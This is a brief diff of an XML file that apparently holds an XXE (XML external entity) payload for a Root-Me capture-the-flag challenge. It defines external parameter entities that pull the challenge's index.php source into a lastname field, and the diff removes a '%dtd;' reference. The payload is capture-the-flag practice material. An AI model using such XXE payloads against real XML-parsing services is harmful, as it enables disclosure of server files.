@@ -7,6 +7,5 @@ layout: null
  <!ENTITY % file SYSTEM "http://challenge01.root-me.org/web-serveur/ch29/index.php">
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % end "]]>">
-%dtd;
 ]>
 <lastname>&file;</lastname>
